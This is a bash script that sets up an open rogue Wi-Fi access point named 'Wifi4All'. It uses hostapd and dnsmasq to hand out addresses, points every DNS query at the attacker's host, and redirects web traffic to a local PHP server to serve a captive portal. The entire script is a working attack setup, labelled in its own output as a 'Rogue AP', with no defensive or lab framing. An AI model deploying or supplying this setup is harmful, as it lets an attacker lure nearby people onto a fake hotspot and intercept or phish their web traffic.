#!/bin/bash

# CONFIGURATION
IFACE="wlan1"
SSID="Wifi4All"
CHANNEL="6"
AP_IP="10.0.0.1"
SUBNET="10.0.0.0"
DHCP_RANGE="10.0.0.10,10.0.0.50"
DNSMASQ_CONF="/etc/dnsmasq.conf"
HOSTAPD_CONF="/etc/hostapd/hostapd.conf"
WEB_ROOT="/var/www/html"

echo "[+] Killing conflicting processes..."
sudo systemctl stop NetworkManager
sudo pkill dnsmasq
sudo pkill hostapd
sudo pkill php
sudo systemctl stop lighttpd

echo "[+] Configuring interface $IFACE..."
sudo ip link set $IFACE down
sudo ip addr flush dev $IFACE
sudo ip addr add $AP_IP/24 dev $IFACE
sudo ip link set $IFACE up

echo "[+] Writing hostapd config..."
sudo tee $HOSTAPD_CONF > /dev/null <<EOF
interface=$IFACE
ssid=$SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
ignore_broadcast_ssid=0
EOF

echo "[+] Writing dnsmasq config..."
sudo tee $DNSMASQ_CONF > /dev/null <<EOF
interface=$IFACE
dhcp-range=$DHCP_RANGE,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
address=/#/$AP_IP
EOF

echo "[+] Starting dnsmasq..."
sudo dnsmasq -C $DNSMASQ_CONF

echo "[+] Starting hostapd..."
sudo hostapd $HOSTAPD_CONF &

echo "[+] Starting PHP built-in server..."
cd $WEB_ROOT
php -S $AP_IP:80 &

echo "[+] Enabling IP forwarding and iptables..."
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -F
sudo iptables -F
sudo iptables -t nat -A POSTROUTING -o $IFACE -j MASQUERADE
sudo iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -j DNAT --to-destination $AP_IP:80

echo "[+] Rogue AP setup complete. Connect to '$SSID' and open any website to test captive portal."

